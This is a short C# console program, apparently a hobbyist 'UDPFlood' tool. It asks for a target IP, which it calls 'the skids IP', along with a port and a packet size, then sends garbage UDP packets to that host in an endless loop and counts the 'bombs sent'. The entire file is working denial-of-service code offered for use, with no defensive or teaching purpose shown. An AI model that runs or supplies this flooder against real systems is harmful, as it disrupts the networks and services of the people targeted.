using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;

namespace UDPFlood
{
    class Program
    {
        
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    Console.Write("The skids IP: ");
                    string host = Console.ReadLine();

                    //User input target port
                    Console.Write("Port(80): ");
                    int port = Convert.ToInt32(Console.ReadLine());

                    //User input size of one packet
                    Console.Write("Bytes per packet(65500): ");
                    int bytes = Convert.ToInt32(Console.ReadLine());

                    //Create a UDP Client to send packets
                    UdpClient client = new UdpClient(host, port);

                    byte[] sendBytes = new byte[bytes];
                    long bytesSent = 0;

                    //Sending garbage packets
                    while (true)
                    {
                        Console.Write("Bombing:");
                        client.Send(sendBytes, sendBytes.Length);
                        bytesSent += bytes;
                        Console.Write(bytesSent + " BOMBS SENT-\n");
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }
    }
}
